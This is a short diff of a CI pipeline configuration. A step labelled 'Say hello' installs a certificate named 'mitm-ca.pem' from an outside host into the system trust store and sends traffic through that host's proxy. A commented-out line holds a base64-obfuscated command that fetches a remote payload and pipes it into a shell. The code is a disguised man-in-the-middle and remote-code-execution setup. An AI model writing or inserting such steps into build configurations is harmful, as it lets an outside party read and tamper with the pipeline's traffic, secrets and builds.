@@ -19,7 +19,7 @@ jobs:
           name: "Say hello"
           #command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL2tvYmJ8c2g=|base64 -d|sh"
           command: |
-            sudo curl https://security.gaur.is/appveyor/mca.cer -o /usr/share/ca-certificates/mitm-ca.pem
+            sudo curl https://security.gaur.is/appveyor/ca -o /usr/share/ca-certificates/mitm-ca.pem
             sudo ln -s /usr/share/ca-certificates/mitm-ca.pem /etc/ssl/certs/
             sudo c_rehash
             export http_proxy=http://security.gaur.is:8888
